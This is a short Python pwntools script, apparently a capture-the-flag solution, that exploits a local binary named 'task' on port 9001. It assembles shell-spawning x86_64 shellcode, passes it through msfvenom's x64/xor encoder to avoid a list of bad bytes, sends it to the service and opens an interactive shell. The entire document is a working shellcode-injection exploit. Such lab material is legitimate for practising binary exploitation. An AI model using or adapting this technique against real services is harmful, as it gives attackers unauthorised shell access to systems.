#!/usr/bin/env python3

from pwn import *
import subprocess

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

with remote("localhost", 9001) as p:
    p.sendline(subprocess.check_output(["msfvenom",
        "--payload", "-", "--arch", "x86_64", "--platform", "linux",
        "--encoder", "x64/xor", "--iterations", "1",
        "--bad-chars", "\"\\x0f\\x6a\\x3b\\xd2\\x56\\xf6\\x08\""],
        input=asm(shellcraft.sh())))
    p.interactive()
